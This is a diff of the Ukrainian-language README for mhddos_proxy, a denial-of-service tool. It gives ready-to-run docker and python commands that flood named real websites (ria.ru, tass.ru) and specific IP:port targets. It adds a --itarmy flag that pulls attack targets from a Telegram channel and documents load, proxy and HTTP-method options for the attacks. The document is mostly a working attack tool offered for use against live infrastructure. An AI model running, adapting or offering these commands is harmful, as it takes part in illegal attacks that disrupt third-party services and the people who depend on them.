@@ -6,6 +6,9 @@
 - Ефективне використання ресурсів завдяки асихронній архітектурі
 
 ### ⏱ Останні оновлення
+  
+Оновлення версії для Windows | Mac | Linux | Android | Docker: https://telegra.ph/Onovlennya-mhddos-proxy-04-16  
+  
 
 - **15.05.2022**
   - Повністю оновлена асинхронна версія, що забезпечує максимальну ефективність та мінімальне навантаження на систему
@@ -52,11 +55,11 @@
 
 ### 🕹 Запуск | Running (наведено різні варіанти цілей)
 
-#### Docker
+#### Docker (для Linux додавайте sudo на початку команди)
 
     docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477
 
-#### Python (якщо не працює - просто python замість python3)
+#### Python (якщо не працює - просто python або python3.10 замість python3)
 
     python3 runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477
 
@@ -64,13 +67,20 @@
 
 **Усі параметри можна комбінувати**, можна вказувати і до і після переліку цілей
 
-Змінити навантаження - `-t XXXX` - максимальна кількість одночасно відкритих зʼєднань, за замовченням - 1000 (якщо на машині одне CPU) або 7500 (якщо більше одного).
+Змінити навантаження - `-t XXXX` - максимальна кількість одночасно відкритих зʼєднань, за замовченням - 1000 (якщо на машині одне CPU) або 7500 (якщо більше одного).  
+
+***Для Linux додавайте `sudo` на початку команди з docker***  
 
     docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru
 
 Щоб переглянути інформацію про хід атаки, додайте прапорець `--table` для таблиці, `--debug` для тексту
 
     docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru
+    
+Щоб атакувати цілі від https://t.me/itarmyofukraine2022 додайте параметр `--itarmy`  
+
+    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table --itarmy
 
 ### 📌Автоматичний шукач нових проксі для mhddos_proxy
 Сам скрипт та інструкції по встановленню тут: https://github.com/porthole-ascend-cinnamon/proxy_finder
@@ -92,6 +102,7 @@
                      [--vpn]
                      [--rpc RPC] 
                      [--http-methods METHOD [METHOD ...]]
+                     [--itarmy]
 
     positional arguments:
       targets                List of targets, separated by space
@@ -106,6 +117,7 @@
       --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
       --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
       --http-methods GET     List of HTTP(s) attack methods to use (default is GET + POST|STRESS).
+      --itarmy               Attack targets from https://t.me/itarmyofukraine2022  
 
 ### Власні проксі
 
@@ -140,4 +152,4 @@ socks4://isdfuser:ashd1spass@IP:PORT
 
     python3 runner.py --proxies proxies.txt https://ria.ru
 
-де proxies.txt - ваша ваш файл зі списком проксі (кожен проксі з нового рядка)
+де `proxies.txt` - ваша ваш файл зі списком проксі (кожен проксі з нового рядка)
